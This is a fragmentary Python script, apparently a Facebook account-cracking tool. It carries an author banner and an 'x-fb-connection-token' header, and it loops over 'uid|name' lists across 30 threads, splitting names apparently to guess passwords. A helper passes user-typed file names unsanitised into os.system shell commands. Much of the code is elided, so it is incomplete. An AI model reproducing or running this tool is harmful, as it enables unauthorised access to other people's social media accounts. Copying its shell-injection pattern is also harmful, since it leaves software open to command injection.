...
from concurrent.futures import ThreadPoolExecutor as Nurtazssb
from string import * 
...
\033[1;37m------------------------------------------------
\033[1;37m Owner   :           Nurtaz
\033[1;37m Facebook:            Nurtaz Chowdhury 
\033[1;37m Github  :            nurtajc
...
def Nurtaz():   
    ...
    if select =='1':
       ...
       cutter()
        ...
        os.system('xdg-open https://www.facebook.com/profile.php?id=100087131574935)
    else:
        print('\n Select valid option ... ')
        time.sleep(2)
        SSB(allkey)
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def pasw(self):       
            ...
            print(47*"-")
            with Nurtazssb(max_workers=30) as ssbworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
...
def cutter():
    ...
    print(" ")
    Nurtaz = input('Saving Put File Name :')
    os.system('touch ' +Nurtaz)
    os.system('sort -r '+ssb+' | uniq > '+Nurtaz)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + ssb )
    print(47*'-')
    print("File Saved To :" + Nurtaz )
    print(47*'-')
